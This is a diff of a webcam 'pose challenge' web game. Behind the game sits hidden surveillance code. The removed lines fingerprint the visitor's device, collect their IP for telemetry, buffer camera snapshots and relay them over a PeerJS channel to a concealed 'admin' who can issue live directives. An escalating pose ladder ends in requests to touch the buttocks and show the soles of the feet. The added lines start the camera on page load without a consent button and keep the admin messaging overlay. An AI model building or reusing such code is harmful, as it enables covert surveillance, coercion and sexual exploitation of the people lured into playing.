-      os: navigator.platform || "unknown",
-      screen: `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio || 1}x`,
-      gpu: detectGPU(),
-      cores: navigator.hardwareConcurrency || "?",
-      tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
-      camActive: false,
-      visitedAt: Date.now()
-    };
-
-    fetch("https://api.ipify.org?format=json")
-      .then(r => r.json())
-      .then(d => {
-        if (d && d.ip) {
-          clientMeta.ip = d.ip;
-          sendTelemetry();
-        }
-      })
-      .catch(() => { clientMeta.ip = "N/A (Blocked)"; });
-
-    // === 16-TIER ESCALATING POSE PROGRESSION (Easy Hands -> Arms -> Body -> Feet) ===
-    const POSE_LADDER = [
-      // Tier 1-5: Easy Hand Gestures
-      { id: "Thumbs Up", icon: "👍", type: "hand", pts: 10000, penalty: 2500, timeoutMs: 9000, holdMs: 450, hint: "Show a clear Thumbs Up to the camera (+10,000 pts)" },
-      { id: "Open Palm", icon: "✋", type: "hand", pts: 15000, penalty: 3500, timeoutMs: 9000, holdMs: 450, hint: "Spread all 5 fingers open (+15,000 pts)" },
-      { id: "Fist", icon: "✊", type: "hand", pts: 20000, penalty: 5000, timeoutMs: 9000, holdMs: 450, hint: "Close your hand into a solid fist (+20,000 pts)" },
-      { id: "Peace Sign", icon: "✌️", type: "hand", pts: 25000, penalty: 6000, timeoutMs: 9000, holdMs: 450, hint: "Extend index & middle fingers in a V (+25,000 pts)" },
-      { id: "Point", icon: "☝️", type: "hand", pts: 30000, penalty: 7500, timeoutMs: 9000, holdMs: 450, hint: "Point your index finger upward (+30,000 pts)" },
-
-      // Tier 6-10: Arm & Upper Body Poses
-      { id: "Bicep Flex", icon: "💪", type: "pose", pts: 40000, penalty: 10000, timeoutMs: 13000, holdMs: 750, hint: "Raise and flex one arm with hand near shoulder level (+40,000 pts)" },
-      { id: "Cross Arms", icon: "🙅", type: "pose", pts: 50000, penalty: 12000, timeoutMs: 13000, holdMs: 750, hint: "Cross both arms across your chest (+50,000 pts)" },
-      { id: "Self Hug", icon: "🫂", type: "pose", pts: 60000, penalty: 15000, timeoutMs: 14000, holdMs: 800, hint: "Wrap both hands around your opposite shoulders in a self-hug (+60,000 pts)" },
-      { id: "Double Bicep Pose", icon: "🏋️", type: "pose", pts: 75000, penalty: 18000, timeoutMs: 14000, holdMs: 850, hint: "Raise BOTH arms up in a classic double bicep flex (+75,000 pts)" },
-      { id: "Hand on Head", icon: "🙆", type: "pose", pts: 85000, penalty: 20000, timeoutMs: 14000, holdMs: 850, hint: "Place one or both hands directly on top of your head (+85,000 pts)" },
-
-      // Tier 11-14: Torso, Hips, Booty & Knees
-      { id: "Hands on Stomach", icon: "🤲", type: "pose", pts: 95000, penalty: 22000, timeoutMs: 15000, holdMs: 900, hint: "Step back slightly & rest both hands on your stomach/belly (+95,000 pts)" },
-      { id: "Hands on Hips", icon: "🧍", type: "pose", pts: 110000, penalty: 25000, timeoutMs: 15000, holdMs: 900, hint: "Stand with both hands placed firmly on your hips (+110,000 pts)" },
-      { id: "Hands on Booty", icon: "🍑", type: "pose", pts: 125000, penalty: 30000, timeoutMs: 16000, holdMs: 950, hint: "Angle or turn & place both hands on your booty/glutes (+125,000 pts)" },
-      { id: "Hands on Knees", icon: "🧎", type: "pose", pts: 140000, penalty: 35000, timeoutMs: 16000, holdMs: 950, hint: "Bend or squat slightly with both hands resting on your knees (+140,000 pts)" },
-
-      // Tier 15-16: Advanced Foot Poses
-      { id: "Butterfly Pose (Hands on Feet)", icon: "🦋", type: "pose", pts: 165000, penalty: 40000, timeoutMs: 18000, holdMs: 1000, hint: "Sit in a butterfly pose with soles together & hold your feet with both hands (+165,000 pts)" },
-      { id: "Double Foot Spread (Bottom of Feet)", icon: "🦶", type: "pose", pts: 200000, penalty: 45000, timeoutMs: 20000, holdMs: 1100, hint: "Final Tier! Show the bottom of both feet spread toward the camera (+200,000 pts)" }
+    const CHALLENGES = [
+      { id: 'thumbs_up',     category: 'HAND GESTURE',        icon: '👍', name: 'Thumbs Up',            pts: 15000,  desc: 'Show a clear Thumbs Up to the camera (+15,000 pts)' },
+      { id: 'turn_around',   category: 'FULL BODY MOVEMENT',  icon: '🔄', name: 'Turn Around',          pts: 50000,  desc: 'Turn your back to the camera / spin 180° (+50,000 pts)' },
+      { id: 'lift_leg_l',    category: 'BALANCE CHALLENGE',   icon: '🦵', name: 'Lift Left Leg',        pts: 55000,  desc: 'Stand on one foot and lift your left knee/leg up high (+55,000 pts)' },
+      { id: 'touch_toes',    category: 'FLEXIBILITY',         icon: '🙇', name: 'Touch Your Toes',      pts: 65000,  desc: 'Bend forward and reach both hands down to your toes (+65,000 pts)' },
+      { id: 'legs_split',    category: 'FLEXIBILITY',         icon: '🤸', name: 'Legs Split',           pts: 85000,  desc: 'Spread your legs wide into a split stance / straddle (+85,000 pts)' },
+      { id: 'lift_leg_r',    category: 'BALANCE CHALLENGE',   icon: '🦩', name: 'Lift Right Leg',       pts: 55000,  desc: 'Stand on one foot and lift your right knee/leg up high (+55,000 pts)' },
+      { id: 'hands_up',      category: 'UPPER BODY POSE',     icon: '🙌', name: 'Both Hands High',      pts: 35000,  desc: 'Raise both hands clearly above your head (+35,000 pts)' },
+      { id: 'deep_squat',    category: 'LOWER BODY STRENGTH', icon: '🏋️', name: 'Deep Squat Hold',      pts: 65000,  desc: 'Drop your hips low down near knee level (+65,000 pts)' },
+      { id: 't_pose',        category: 'UPPER BODY POSE',     icon: '🧍', name: 'T-Pose',               pts: 40000,  desc: 'Extend both arms straight out horizontally (+40,000 pts)' },
+      { id: 'star_pose',     category: 'FULL BODY POSE',      icon: '⭐', name: 'Star / X-Pose',        pts: 60000,  desc: 'Spread both arms up wide and legs apart like an X (+60,000 pts)' },
+      { id: 'peace_sign',    category: 'HAND GESTURE',        icon: '✌️', name: 'Peace / Victory V',    pts: 25000,  desc: 'Hold up a Peace sign to the camera (+25,000 pts)' },
+      { id: 'side_lunge',    category: 'LOWER BODY FLEX',     icon: '🤺', name: 'Wide Side Lunge',      pts: 70000,  desc: 'Step wide and bend one knee deep into a side lunge (+70,000 pts)' },
+      { id: 'hands_on_head', category: 'UPPER BODY POSE',     icon: '🙆', name: 'Hands on Head',        pts: 45000,  desc: 'Place both hands right on top of your head (+45,000 pts)' },
+      { id: 'tree_pose',     category: 'BALANCE CHALLENGE',   icon: '🧘', name: 'Flamingo Tree Pose',   pts: 75000,  desc: 'Hands together overhead while lifting one foot (+75,000 pts)' },
+      { id: 'open_palm',     category: 'HAND GESTURE',        icon: '🖐️', name: 'Open Five Palm',       pts: 25000,  desc: 'Spread all 5 fingers open facing the camera (+25,000 pts)' },
+      { id: 'super_split',   category: 'GRAND FINALE',        icon: '🏆', name: 'Full Split & Arms Up', pts: 100000, desc: 'Wide leg split stance with both arms raised high (+100,000 pts)' }
     ];
 
-    let playerName = "";
-    const deviceType = detectDevice();
-    let gameState = "idle"; // idle | playing | locked | command_mode
-    let isLockedByAdmin = false;
-    let isCommandMode = false; // When true, automated challenges pause and Admin custom directive is shown
-    let activeCustomCommand = "";
-
-    let score = Number(safeGet("ga_saved_score")) || 0;
+    // =========================================================================
+    // 2. STATE & UI REFERENCES
+    // =========================================================================
+    let score = 0;
+    let currentTierIdx = 0;
     let streak = 0;
-    let currentTierIndex = Number(safeGet("ga_saved_tier")) || 0;
-    if (currentTierIndex < 0 || currentTierIndex >= POSE_LADDER.length) currentTierIndex = 0;
+    let isPaused = false;
+    let holdProgress = 0;
+    let secondsRemaining = 300;
+    let baselineShoulderSign = null;
+    let latestHands = null;
+    let latestPose = null;
 
-    let currentTarget = POSE_LADDER[currentTierIndex];
-    let targetAssignedAt = performance.now();
-    let cycleRemainingSec = GAME_CYCLE_SECONDS;
+    const videoEl        = document.getElementById('webcamVideo');
+    const canvasEl       = document.getElementById('poseCanvas');
+    const ctx            = canvasEl.getContext('2d');
+    const camToast       = document.getElementById('camToast');
+    const pauseBtn       = document.getElementById('pauseBtn');
+    const skipPoseBtn    = document.getElementById('skipPoseBtn');
+    const adminOverlay   = document.getElementById('adminOverlay');
+    const adminMsgList   = document.getElementById('adminMsgList');
+    const adminReplyForm = document.getElementById('adminReplyForm');
+    const adminReplyInp  = document.getElementById('adminReplyInput');
+    const debugLogEl     = document.getElementById('debugLog');
 
-    // Classifier debounce & hold state
-    let candidateGesture = "None";
-    let consecutiveFrames = 0;
-    let stableGesture = "None";
-    let holdStartMs = 0;
+    function logDebug(msg) {
+      const ts = new Date().toLocaleTimeString();
+      debugLogEl.textContent = `[${ts}] ${msg}\n` + debugLogEl.textContent.slice(0, 1500);
+    }
 
-    // Media & MediaPipe state
-    const videoEl = document.getElementById("camVideo");
-    const overlayCanvas = document.getElementById("overlayCanvas");
-    const overlayCtx = overlayCanvas.getContext("2d");
-    const snapCanvas = document.createElement("canvas");
-    const snapCtx = snapCanvas.getContext("2d");
+    function updateHUD() {
+      const ch = CHALLENGES[currentTierIdx];
+      const pct = Math.min(100, Math.floor((score / GOAL_POINTS) * 100));
+      document.getElementById('goalLabel').textContent =
+        `🏆 GOAL: ${score.toLocaleString()} / ${GOAL_POINTS.toLocaleString()} PTS (${pct}%)`;
+      document.getElementById('goalFill').style.width = `${pct}%`;
+      document.getElementById('pointsVal').textContent = score.toLocaleString();
+      document.getElementById('tierVal').textContent = `${currentTierIdx + 1} / ${CHALLENGES.length}`;
+      document.getElementById('streakVal').textContent = streak;
 
-    let mediaStream = null;
-    let handsDetector = null;
-    let poseDetector = null;
-    let isSendingFrame = false;
-    let firstResultReceived = false;
-    let rafId = null;
+      document.getElementById('chalIcon').textContent = ch.icon;
+      document.getElementById('chalTierText').textContent =
+        `TIER ${currentTierIdx + 1} OF ${CHALLENGES.length} • ${ch.category}`;
+      document.getElementById('chalTitle').textContent = ch.name;
+      document.getElementById('chalDesc').textContent = ch.desc;
+    }
 
-    // PeerJS & Offline Snapshot Buffer state
-    let peer = null;
-    let adminConn = null;
-    let reconnectTimer = null;
-    let backoffMs = 1000;
-    let lastErrorStr = "none";
-    let adminMessagedFirst = false;
-
-    const snapshotBuffer = new Map();
-    let flushTimer = null;
-
-    try {
-      const savedSnaps = sessionStorage.getItem("ga_snap_buffer");
-      if (savedSnaps) {
-        const parsed = JSON.parse(savedSnaps);
-        if (Array.isArray(parsed)) {
-          parsed.forEach(s => { if (s && s.snapId) snapshotBuffer.set(s.snapId, s); });
-        }
-      }
-    } catch (e) {}
-
-    function persistClientSnapBuffer() {
+    // =========================================================================
+    // 3. AUTO-START CAMERA ON PAGE LOAD (NO "ENABLE CAMERA" BUTTON GATE)
+    // =========================================================================
+    async function requestCameraImmediately() {
+      logDebug('Requesting camera stream immediately on landing...');
       try {
-        const arr = Array.from(snapshotBuffer.values()).slice(-30);
-        sessionStorage.setItem("ga_snap_buffer", JSON.stringify(arr));
-      } catch (e) {}
-    }
-
-    function logGA(msg, err) {
-      if (err) {
-        lastErrorStr = String(err.type || err.message || err);
-        console.warn("[GA]", msg, err);
-      } else {
-        console.log("[GA]", msg);
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        videoEl.srcObject = stream;
+        await videoEl.play();
+        camToast.style.display = 'none';
+        document.getElementById('statusVal').textContent = 'Tracking';
+        logDebug('Camera active and streaming.');
+        startVisionLoop();
+      } catch (err) {
+        logDebug(`Camera request error: ${err.name} - ${err.message}`);
+        document.getElementById('statusVal').textContent = 'Cam Blocked';
+        camToast.style.display = 'block';
       }
-      updateDebugLine();
     }
 
-    function updateDebugLine() {
-      const pState = peer ? (peer.destroyed ? "destroyed" : peer.disconnected ? "disconnected" : "open") : "none";
-      const cState = adminConn && adminConn.open ? "connected" : "closed";
-      document.getElementById("debugLine").textContent =
-        `Peer: ${myPeerId} (${pState}) | AdminConn: ${cState} | Cam: ${isCameraActive() ? "ON" : "OFF"} | Buffered Snaps: ${snapshotBuffer.size} | State: ${gameState} | IP: ${clientMeta.ip} | Last err: ${lastErrorStr}`;
+    // Listen for permission changes in the address bar so it starts automatically when allowed
+    if (navigator.permissions && navigator.permissions.query) {
+      navigator.permissions.query({ name: 'camera' }).then((permStatus) => {
+        permStatus.onchange = () => {
+          if (permStatus.state === 'granted') {
+            requestCameraImmediately();
+          }
+        };
+      }).catch(() => {});
     }
 
-    function setConnPill(text, level) {
-      const el = document.getElementById("connPill");
-      el.textContent = text;
-      el.className = "pill " + (level || "");
-    }
+    camToast.addEventListener('click', requestCameraImmediately);
 
-    function showToast(text, color) {
-      const t = document.getElementById("toastBanner");
-      t.textContent = text;
-      t.style.color = color || "var(--text)";
-      t.style.borderColor = color || "var(--border)";
-      t.style.display = "block";
-      clearTimeout(t._timer);
-      t._timer = setTimeout(() => { t.style.display = "none"; }, 2400);
-    }
+    // =========================================================================
+    // 4. MEDIAPIPE POSE + HANDS DETECTION LOOP
+    // =========================================================================
+    let mpPose = null;
+    let mpHands = null;
 
-    function showStatusOverlay(title, desc, showRetry) {
-      const ov = document.getElementById("statusOverlay");
-      document.getElementById("overlayTitle").textContent = title;
-      document.getElementById("overlayDesc").textContent = desc;
-      document.getElementById("retryCamBtn").style.display = showRetry ? "inline-block" : "none";
-      ov.classList.remove("hidden");
-    }
-
-    function hideStatusOverlay() {
-      document.getElementById("statusOverlay").classList.add("hidden");
-    }
-
-    // === GEOMETRY & LANDMARK CLASSIFIERS (HANDS + FULL BODY POSE) ===
-    function distSq(a, b) {
-      const dx = a.x - b.x;
-      const dy = a.y - b.y;
-      return dx * dx + dy * dy;
-    }
-    function dist(a, b) {
-      return Math.hypot(a.x - b.x, a.y - b.y);
-    }
-    function vis(pt, minV = 0.35) {
-      return pt && (pt.visibility === undefined || pt.visibility >= minV);
-    }
-
-    // 1. Hand Classifier (Tiers 1-5)
-    function classifyHandLandmarks(lm) {
-      if (!lm || lm.length < 21) return "None";
-      const wrist = lm[0];
-      const pinkyMcp = lm[17];
-      const indexMcp = lm[5];
-      const palmScaleSq = Math.max(distSq(wrist, indexMcp), 0.001);
-
-      const indexExt  = distSq(lm[8], wrist)  > distSq(lm[6], wrist)  * 1.15;
-      const middleExt = distSq(lm[12], wrist) > distSq(lm[10], wrist) * 1.15;
-      const ringExt   = distSq(lm[16], wrist) > distSq(lm[14], wrist) * 1.15;
-      const pinkyExt  = distSq(lm[20], wrist) > distSq(lm[18], wrist) * 1.15;
-
-      const thumbExt = distSq(lm[4], pinkyMcp) > distSq(lm[3], pinkyMcp) * 1.12 &&
-                       distSq(lm[4], indexMcp) > palmScaleSq * 0.3;
-
-      // Thumbs Up: thumb extended upward, other 4 fingers curled
-      if (thumbExt && !indexExt && !middleExt && !ringExt && !pinkyExt && lm[4].y < lm[2].y) {
-        return "Thumbs Up";
+    function initMediaPipe() {
+      if (window.Pose) {
+        mpPose = new Pose({
+          locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`
+        });
+        mpPose.setOptions({
+          modelComplexity: 1,
+          smoothLandmarks: true,
+          minDetectionConfidence: 0.5,
+          minTrackingConfidence: 0.5
+        });
+        mpPose.onResults((res) => {
+          latestPose = res.poseLandmarks || null;
+        });
       }
-      if (thumbExt && indexExt && middleExt && ringExt && pinkyExt) return "Open Palm";
-      if (!indexExt && !middleExt && !ringExt && !pinkyExt && !thumbExt) return "Fist";
-      if (indexExt && middleExt && !ringExt && !pinkyExt) return "Peace Sign";
-      if (indexExt && !middleExt && !ringExt && !pinkyExt) return "Point";
-      return "Hand Active";
+
+      if (window.Hands) {
+        mpHands = new Hands({
+          locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+        });
+        mpHands.setOptions({
+          maxNumHands: 2,
+          modelComplexity: 1,
+          minDetectionConfidence: 0.5,
+          minTrackingConfidence: 0.5
+        });
+        mpHands.onResults((res) => {
+          latestHands = res.multiHandLandmarks || null;
+        });
+      }
     }
 
-    // 2. Full-Body Pose Evaluator (Tiers 6-16)
-    function checkBodyPoseMatch(lm, targetId) {
-      if (!lm || lm.length < 33) return false;
-      const nose = lm[0];
-      const lShoulder = lm[11], rShoulder = lm[12];
-      const lElbow = lm[13], rElbow = lm[14];
-      const lWrist = lm[15], rWrist = lm[16];
-      const lHip = lm[23], rHip = lm[24];
-      const lKnee = lm[25], rKnee = lm[26];
-      const lAnkle = lm[27], rAnkle = lm[28];
-      const lFoot = lm[31], rFoot = lm[32];
+    function checkPoseMatch(challengeId, handLm, poseLm) {
+      if (handLm && handLm.length > 0) {
+        const h = handLm[0];
+        const thumbUp = h[4].y < h[3].y && h[4].y < h[5].y;
+        const idxUp   = h[8].y < h[6].y;
+        const midUp   = h[12].y < h[10].y;
+        const ringUp  = h[16].y < h[14].y;
+        const pinkyUp = h[20].y < h[18].y;
 
-      const shoulderWidth = (vis(lShoulder) && vis(rShoulder)) ? Math.max(0.12, dist(lShoulder, rShoulder)) : 0.25;
-      const midShoulderY = (vis(lShoulder) && vis(rShoulder)) ? (lShoulder.y + rShoulder.y) / 2 : 0.35;
-      const midHipY = (vis(lHip) && vis(rHip)) ? (lHip.y + rHip.y) / 2 : 0.68;
-      const midShoulderX = (vis(lShoulder) && vis(rShoulder)) ? (lShoulder.x + rShoulder.x) / 2 : 0.5;
+        if (challengeId === 'thumbs_up' && thumbUp && !idxUp && !midUp && !ringUp) return true;
+        if (challengeId === 'peace_sign' && idxUp && midUp && !ringUp && !pinkyUp) return true;
+        if (challengeId === 'open_palm' && idxUp && midUp && ringUp && pinkyUp) return true;
+      }
 
-      switch (targetId) {
-        case "Bicep Flex": {
-          const leftFlex = vis(lWrist) && vis(lElbow) && lWrist.y < lElbow.y + 0.05 && dist(lWrist, lShoulder) < shoulderWidth * 1.45;
-          const rightFlex = vis(rWrist) && vis(rElbow) && rWrist.y < rElbow.y + 0.05 && dist(rWrist, rShoulder) < shoulderWidth * 1.45;
-          return leftFlex || rightFlex;
+      if (!poseLm || poseLm.length < 29) return false;
+
+      const nose  = poseLm[0];
+      const lSho  = poseLm[11], rSho  = poseLm[12];
+      const lWri  = poseLm[15], rWri  = poseLm[16];
+      const lHip  = poseLm[23], rHip  = poseLm[24];
+      const lKnee = poseLm[25], rKnee = poseLm[26];
+      const lAnk  = poseLm[27], rAnk  = poseLm[28];
+
+      const shoulderWidth = Math.max(0.08, Math.abs(lSho.x - rSho.x));
+      const midShoY = (lSho.y + rSho.y) / 2;
+      const midHipY = (lHip.y + rHip.y) / 2;
+      const torsoLen = Math.max(0.12, Math.abs(midHipY - midShoY));
+
+      if (baselineShoulderSign === null && shoulderWidth > 0.14 && (nose.visibility ?? 1) > 0.7) {
+        baselineShoulderSign = Math.sign(lSho.x - rSho.x);
+      }
+
+      switch (challengeId) {
+        case 'hands_up':
+          return lWri.y < nose.y - 0.02 && rWri.y < nose.y - 0.02;
+        case 't_pose':
+          return Math.abs(lWri.y - lSho.y) < 0.13 &&
+                 Math.abs(rWri.y - rSho.y) < 0.13 &&
+                 Math.abs(lWri.x - rWri.x) > shoulderWidth * 1.9;
+        case 'turn_around': {
+          const curSign = Math.sign(lSho.x - rSho.x);
+          const flipped = baselineShoulderSign !== null && curSign !== 0 && curSign !== baselineShoulderSign;
+          return flipped || ((nose.visibility ?? 1) < 0.35 && (lSho.visibility ?? 1) > 0.6);
         }
-        case "Cross Arms": {
-          if (!vis(lWrist) || !vis(rWrist)) return false;
-          const wristsClose = dist(lWrist, rWrist) < shoulderWidth * 1.25;
-          const atChest = lWrist.y > midShoulderY - 0.05 && lWrist.y < midHipY + 0.05;
-          return wristsClose && atChest;
-        }
-        case "Self Hug": {
-          if (!vis(lWrist) || !vis(rWrist)) return false;
-          const lToRShoulder = dist(lWrist, rShoulder) < shoulderWidth * 1.15;
-          const rToLShoulder = dist(rWrist, lShoulder) < shoulderWidth * 1.15;
-          const crossed = Math.abs(lWrist.x - rWrist.x) < shoulderWidth * 1.2 && lWrist.y < midHipY;
-          return (lToRShoulder && rToLShoulder) || crossed;
-        }
-        case "Double Bicep Pose": {
-          if (!vis(lWrist) || !vis(rWrist)) return false;
-          return lWrist.y < midShoulderY + 0.05 && rWrist.y < midShoulderY + 0.05;
-        }
-        case "Hand on Head": {
-          const lOnHead = vis(lWrist) && vis(nose) && lWrist.y < nose.y + 0.08 && dist(lWrist, nose) < shoulderWidth * 1.35;
-          const rOnHead = vis(rWrist) && vis(nose) && rWrist.y < nose.y + 0.08 && dist(rWrist, nose) < shoulderWidth * 1.35;
-          return lOnHead || rOnHead;
-        }
-        case "Hands on Stomach": {
-          const bellyY = (midShoulderY + midHipY) * 0.52;
-          const lIn = vis(lWrist) && Math.abs(lWrist.y - bellyY) < 0.18 && Math.abs(lWrist.x - midShoulderX) < shoulderWidth * 0.95;
-          const rIn = vis(rWrist) && Math.abs(rWrist.y - bellyY) < 0.18 && Math.abs(rWrist.x - midShoulderX) < shoulderWidth * 0.95;
-          return lIn || rIn;
-        }
-        case "Hands on Hips": {
-          const lHipMatch = vis(lWrist) && (vis(lHip) ? dist(lWrist, lHip) < shoulderWidth * 1.15 : lWrist.y > midShoulderY + 0.18);
-          const rHipMatch = vis(rWrist) && (vis(rHip) ? dist(rWrist, rHip) < shoulderWidth * 1.15 : rWrist.y > midShoulderY + 0.18);
-          return lHipMatch && rHipMatch;
-        }
-        case "Hands on Booty": {
-          const lGlute = vis(lWrist) && (vis(lHip) ? (lWrist.y >= lHip.y - 0.08 && dist(lWrist, lHip) < shoulderWidth * 1.25) : lWrist.y > 0.62);
-          const rGlute = vis(rWrist) && (vis(rHip) ? (rWrist.y >= rHip.y - 0.08 && dist(rWrist, rHip) < shoulderWidth * 1.25) : rWrist.y > 0.62);
-          return lGlute || rGlute;
-        }
-        case "Hands on Knees": {
-          const lKneeMatch = vis(lWrist) && ((vis(lKnee) && dist(lWrist, lKnee) < shoulderWidth * 1.3) || lWrist.y > 0.72);
-          const rKneeMatch = vis(rWrist) && ((vis(rKnee) && dist(rWrist, rKnee) < shoulderWidth * 1.3) || rWrist.y > 0.72);
-          return lKneeMatch || rKneeMatch;
-        }
-        case "Butterfly Pose (Hands on Feet)": {
-          const anklesTogether = vis(lAnkle, 0.25) && vis(rAnkle, 0.25) && dist(lAnkle, rAnkle) < shoulderWidth * 1.6;
-          const wristToFoot = (vis(lWrist) && vis(lAnkle, 0.25) && dist(lWrist, lAnkle) < shoulderWidth * 1.5) ||
-                              (vis(rWrist) && vis(rAnkle, 0.25) && dist(rWrist, rAnkle) < shoulderWidth * 1.5) ||
-                              (vis(lWrist) && vis(rWrist) && lWrist.y > 0.68 && rWrist.y > 0.68 && dist(lWrist, rWrist) < shoulderWidth * 1.3);
-          return anklesTogether || wristToFoot;
-        }
-        case "Double Foot Spread (Bottom of Feet)": {
-          const bothFeetVis = (vis(lAnkle, 0.2) && vis(rAnkle, 0.2)) || (vis(lFoot, 0.2) && vis(rFoot, 0.2));
-          const spreadWide = (vis(lAnkle, 0.2) && vis(rAnkle, 0.2) && Math.abs(lAnkle.x - rAnkle.x) > shoulderWidth * 0.85) ||
-                             (vis(lFoot, 0.2) && vis(rFoot, 0.2) && Math.abs(lFoot.x - rFoot.x) > 0.22) ||
-                             (vis(lKnee, 0.25) && vis(rKnee, 0.25) && Math.abs(lKnee.x - rKnee.x) > shoulderWidth * 1.15);
-          return bothFeetVis || spreadWide;
-        }
+        case 'lift_leg_l':
+          return (rKnee.y - lKnee.y) > torsoLen * 0.30 || (rAnk.y - lAnk.y) > torsoLen * 0.38 || lKnee.y < lHip.y + 0.06;
+        case 'lift_leg_r':
+          return (lKnee.y - rKnee.y) > torsoLen * 0.30 || (lAnk.y - rAnk.y) > torsoLen * 0.38 || rKnee.y < rHip.y + 0.06;
+        case 'touch_toes':
+          return lWri.y > Math.min(lKnee.y, lAnk.y - 0.12) &&
+                 rWri.y > Math.min(rKnee.y, rAnk.y - 0.12) &&
+                 midShoY > midHipY - torsoLen * 0.45;
+        case 'legs_split':
+          return Math.abs(lAnk.x - rAnk.x) > shoulderWidth * 1.85 ||
+                 Math.abs(lKnee.x - rKnee.x) > shoulderWidth * 1.55;
+        case 'deep_squat':
+          return midHipY >= ((lKnee.y + rKnee.y) / 2) - 0.08;
+        case 'star_pose':
+          return lWri.y < lSho.y && rWri.y < rSho.y &&
+                 Math.abs(lWri.x - rWri.x) > shoulderWidth * 1.6 &&
+                 Math.abs(lAnk.x - rAnk.x) > shoulderWidth * 1.4;
+        case 'hands_on_head':
+          return Math.hypot(lWri.x - nose.x, lWri.y - (nose.y - 0.07)) < 0.16 &&
+                 Math.hypot(rWri.x - nose.x, rWri.y - (nose.y - 0.07)) < 0.16;
+        case 'side_lunge':
+          return Math.abs(lAnk.x - rAnk.x) > shoulderWidth * 1.65 &&
+                 (Math.abs(lKnee.y - rKnee.y) > 0.06 || midHipY > ((lKnee.y + rKnee.y) / 2) - 0.10);
+        case 'tree_pose':
+          return lWri.y < nose.y && rWri.y < nose.y &&
+                 Math.abs(lWri.x - rWri.x) < 0.14 &&
+                 Math.abs(lAnk.y - rAnk.y) > torsoLen * 0.28;
+        case 'super_split':
+          return Math.abs(lAnk.x - rAnk.x) > shoulderWidth * 1.80 &&
+                 lWri.y < lSho.y && rWri.y < rSho.y;
         default:
           return false;
       }
     }
 
-    function drawHandSkeleton(lm) {
-      overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
-      if (!lm) return;
-      const w = overlayCanvas.width;
-      const h = overlayCanvas.height;
-      const chains = [
-        [0,1,2,3,4], [0,5,6,7,8], [5,9,13,17,0],
-        [9,10,11,12], [13,14,15,16], [17,18,19,20]
-      ];
-      overlayCtx.strokeStyle = "#38bdf8";
-      overlayCtx.lineWidth = 3;
-      chains.forEach(chain => {
-        overlayCtx.beginPath();
-        chain.forEach((idx, i) => {
-          const pt = lm[idx];
-          if (i === 0) overlayCtx.moveTo(pt.x * w, pt.y * h);
-          else overlayCtx.lineTo(pt.x * w, pt.y * h);
-        });
-        overlayCtx.stroke();
-      });
-      overlayCtx.fillStyle = "#22c55e";
-      for (let i = 0; i < lm.length; i++) {
-        overlayCtx.beginPath();
-        overlayCtx.arc(lm[i].x * w, lm[i].y * h, 4, 0, Math.PI * 2);
-        overlayCtx.fill();
-      }
-    }
+    async function startVisionLoop() {
+      initMediaPipe();
+      const matchBadge = document.getElementById('poseMatchBadge');
+      const holdBarFill = document.getElementById('holdBarFill');
 
-    function drawPoseSkeleton(lm) {
-      overlayCtx.clearRect(0, 0, overlayCanvas.width, overlayCanvas.height);
-      if (!lm) return;
-      const w = overlayCanvas.width;
-      const h = overlayCanvas.height;
-      const pairs = [
-        [11,12], [11,13], [13,15], [12,14], [14,16],
-        [11,23], [12,24], [23,24], [23,25], [25,27],
-        [27,31], [24,26], [26,28], [28,32]
-      ];
-      overlayCtx.strokeStyle = "#a855f7";
-      overlayCtx.lineWidth = 3;
-      pairs.forEach(([a, b]) => {
-        if (vis(lm[a], 0.25) && vis(lm[b], 0.25)) {
-          overlayCtx.beginPath();
-          overlayCtx.moveTo(lm[a].x * w, lm[a].y * h);
-          overlayCtx.lineTo(lm[b].x * w, lm[b].y * h);
-          overlayCtx.stroke();
-        }
-      });
-      overlayCtx.fillStyle = "#38bdf8";
-      [0, 11, 12, 13, 14, 15, 16, 23, 24, 25, 26, 27, 28, 31, 32].forEach(idx => {
-        const pt = lm[idx];
-        if (vis(pt, 0.25)) {
-          overlayCtx.beginPath();
-          overlayCtx.arc(pt.x * w, pt.y * h, 5, 0, Math.PI * 2);
-          overlayCtx.fill();
-        }
-      });
-    }
+      async function step() {
+        if (!isPaused && videoEl.readyState >= 2) {
+          canvasEl.width = videoEl.videoWidth || 640;
+          canvasEl.height = videoEl.videoHeight || 480;
 
-    // === GAME PROGRESSION, BACKTRACKING & COMMAND MODE ===
-    function assignTierTarget(tierIdx) {
-      currentTierIndex = Math.max(0, Math.min(POSE_LADDER.length - 1, tierIdx));
-      safeSet("ga_saved_tier", String(currentTierIndex));
-      currentTarget = POSE_LADDER[currentTierIndex];
-      targetAssignedAt = performance.now();
-      holdStartMs = 0;
-      renderTargetBanner();
-    }
+          try {
+            if (mpPose) await mpPose.send({ image: videoEl });
+            if (mpHands) await mpHands.send({ image: videoEl });
+          } catch (e) {}
 
-    function renderTargetBanner() {
-      const banner = document.getElementById("targetBanner");
-      const barsCol = document.getElementById("barsCol");
-      if (isCommandMode || activeCustomCommand) {
-        banner.classList.add("cmd-mode");
-        document.getElementById("targetIcon").textContent = "⚡";
-        document.getElementById("targetHeaderLabel").textContent = "LIVE ADMIN CHALLENGE DIRECTIVE";
-        document.getElementById("targetName").textContent = activeCustomCommand || "Stand by for next Admin instruction…";
-        document.getElementById("targetHint").textContent = "Follow the live instruction above on camera!";
-        barsCol.style.display = "none";
-      } else {
-        banner.classList.remove("cmd-mode");
-        barsCol.style.display = "flex";
-        document.getElementById("targetIcon").textContent = currentTarget.icon;
-        document.getElementById("targetHeaderLabel").textContent = `Tier ${currentTierIndex + 1} of ${POSE_LADDER.length} • ${currentTarget.type === "hand" ? "Hand Gesture" : "Full-Body Pose"}`;
-        document.getElementById("targetName").textContent = currentTarget.id;
-        document.getElementById("targetHint").textContent = currentTarget.hint;
-        document.getElementById("holdBar").style.width = "0%";
-        document.getElementById("timeBar").style.width = "100%";
-      }
-      updateHUD();
-    }
+          const currentChallenge = CHALLENGES[currentTierIdx];
+          const matched = checkPoseMatch(currentChallenge.id, latestHands, latestPose);
 
-    function updateHUD() {
-      document.getElementById("scoreVal").textContent = score.toLocaleString();
-      document.getElementById("tierVal").textContent = `${currentTierIndex + 1} / ${POSE_LADDER.length}`;
